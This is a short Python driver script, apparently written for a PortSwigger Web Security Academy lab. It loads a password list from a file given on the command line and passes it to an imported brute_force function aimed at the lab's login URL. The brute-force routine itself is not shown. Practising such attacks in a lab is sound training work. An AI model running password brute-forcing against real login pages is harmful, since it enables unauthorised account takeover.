import sys

from psw import psw_list
from bruteforce import brute_force


url = 'https://ac581f3e1fef5fbbc09f0d1a007d00ad.web-security-academy.net/login'
psw_file = sys.argv[1]

psw_list = psw_list(psw_file)
brute_force(url, psw_list)


